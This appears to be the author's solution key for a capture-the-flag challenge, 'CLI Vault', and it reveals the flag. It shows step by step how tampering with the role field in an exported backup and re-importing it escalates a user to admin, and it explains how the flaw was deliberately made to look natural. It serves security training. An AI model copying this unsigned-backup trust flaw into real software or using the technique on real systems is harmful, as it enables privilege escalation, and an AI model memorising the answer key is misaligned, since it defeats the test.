# Solution: CLI Vault (L1-CLI-VAULT-001)

> **Author-only document. Do not distribute to participants.**

## Flag

```
FLAG{export_import_role_escalation_ftw}
```

## Exploit Chain

### Step 1 — Register and Login

```
vault> register
  Username: alice
  Master password: pass1234
  Confirm password: pass1234
[+] Account 'alice' created successfully.

vault> login
  Username: alice
  Password: pass1234
[+] Welcome back, alice! (role: user)
```

**Why:** We need an authenticated session to access export/import. The account is created with `_meta.role = "user"`.

### Step 2 — Export the Vault

```
vault> export
  Export filename [vault_backup.json]: backup.json
[+] Vault exported to 'backup.json'.
```

**Why:** The `export` command serializes the **full user record** including the internal `_meta` field. This leaks the role assignment to a user-controlled file. The exported JSON will look like:

```json
{
  "format_version": 1,
  "exported_at": "2026-03-05T12:00:00",
  "username": "alice",
  "user_data": {
    "password_hash": "...",
    "secrets": {},
    "_meta": {
      "role": "user",
      "created_by": "self-register",
      "created_at": "2026-03-05T12:00:00"
    }
  }
}
```

### Step 3 — Tamper with the Backup

Edit `backup.json` and change:
```json
"role": "user"
```
to:
```json
"role": "admin"
```

**Why:** The backup file is under the user's control. There is no integrity check (no HMAC, no signature) on the exported data.

### Step 4 — Import the Tampered Backup

```
vault> import
  Import filename [vault_backup.json]: backup.json
[+] Vault imported from 'backup.json'. Session refreshed (role: admin).
```

**Why:** The `import` command validates only `format_version` and `username` — it does **not** validate or strip the `_meta` field. It restores `user_data` wholesale into the database and then **refreshes the session role** from the imported `_meta.role`, escalating the user to admin.

### Step 5 — Access the Admin Report

```
vault> admin-report
==================================================
          ADMIN — System Health Report
==================================================
  Vault version  : 1.0.0
  Created        : 2026-03-05T12:00:00
  Total users    : 1
  Total secrets  : 0
  System flag    : FLAG{export_import_role_escalation_ftw}
==================================================
```

**Why:** The `admin-report` command checks `session.role == "admin"`, which is now true after the import. It then prints the system health information, including `vault["_system"]["flag"]`.

## Flaw Analysis

| # | Flaw | Location | Type | Description |
|---|------|----------|------|-------------|
| 1 | Over-serialization | `cmd_export` | Information Exposure | The export includes the internal `_meta` field (containing `role`) in the backup file. Only `secrets` and `password_hash` should be exported, or `_meta` should be stripped/redacted. |
| 2 | Trusted deserialization | `cmd_import` | Improper Input Validation | The import restores `user_data` wholesale without stripping or validating internal fields like `_meta`. It trusts the backup content because the username matched, but username matching does not guarantee data integrity. |
| 3 | Session refresh from untrusted data | `cmd_import` | Privilege Escalation | After importing, the session role is refreshed directly from `_meta.role` in the imported (user-controlled) data, allowing the attacker to set their own role to "admin". |

## Why the Vulnerability Looks Natural

- **Over-serialization (export):** Including `_meta` appears to be a deliberate design choice for "faithful backups" — the developer wanted exports to capture the complete account state so that imports would be a perfect restore.
- **Trusted deserialization (import):** The import validates `format_version` and `username`, which feels like adequate validation. The developer assumed that if the username matches, the data must belong to the user and is safe to restore.
- **Session refresh:** Refreshing the session role after import is logical — if the backup contained an older state, the session should reflect the restored data. The flaw is that the developer didn't consider that the backup file could be tampered with.

## Difficulty Rating

**2/5** — The exploit chain requires reading the source to notice that `_meta` is included in exports, understanding that there's no integrity check, and connecting this to the role-based access control on `admin-report`. Each step is straightforward, but linking them requires basic security reasoning about trust boundaries.
